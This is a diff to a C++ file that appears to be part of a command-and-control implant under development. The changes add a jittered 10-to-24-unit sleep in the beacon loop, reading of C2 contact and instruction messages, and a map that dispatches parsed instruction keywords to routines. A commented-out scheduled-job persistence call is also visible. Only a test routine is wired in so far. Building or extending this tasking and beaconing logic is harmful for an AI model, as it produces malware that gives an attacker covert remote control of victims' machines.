@@ -16,6 +16,9 @@
 #include <cstdlib>
 #include <ctime>
 #include <unistd.h>
+#include <map>
+#include <functional>
+#include "split.h"
 
 Core::Core() {
     std::cout << "[+] Application core initialized" << '\n';
@@ -28,6 +31,10 @@ Core::Core() {
     } catch (...) {
         std::cout << "[!] Core::Core raised an unknown error" << '\n';
     }
+}
+
+void test_function() {
+    std::cout << "[+] This is the test function\n";
 }
 
 void Core::loop() {
@@ -49,18 +56,34 @@ void Core::loop() {
      *      
     */
     // if (established_persistence_count < 1) {scheduled_job_persistence();}
+
+    // https://stackoverflow.com/questions/15151480/simple-dictionary-in-c
+    std::map<std::string, std::function<void(void)>> instruction_keywork_map = {   // mapping instruction keywords to the routine(s) they need to invoke
+
+        { "instruction_test", test_function }
+
+    };
     while (1) {
+
+        // waiting for a 10-24 hour period
         srand(time(0));
         int random_interval = rand() % 14;                                  // random number between 0 and 14
         random_interval = random_interval + 10;                             // makes it a random number between 10 and 24
         std::cout << "[+] Sleeping for: " << random_interval << '\n';
         sleep(random_interval);
+
+        // establishing contact with the C2 (this is necessary because such contact is spread out over days)
         std::string contact_file_contents = read_c2_message("contact.txt");
         if (contact_file_contents == "contact has been established.") {
             std::cout << "[+] Contact has been established within the C2 loop.\n";
         }
+
+        // retrieving the days' instruction(s), parsing the message, and calling the appropriate routines
         std::string current_instruction = read_c2_message("instruction.txt");
         std::cout << "[+] Current instruction: " << current_instruction << '\n';
+
+        // this call returns a vector of strings; keyword.at(0) is the instruction keyword, keyword.at(1) is the file/module
+        std::vector<std::string> keyword = split(current_instruction, ':');
     }
 }
                                             // The TLS encryption of this request has been confirmed with Wireshark
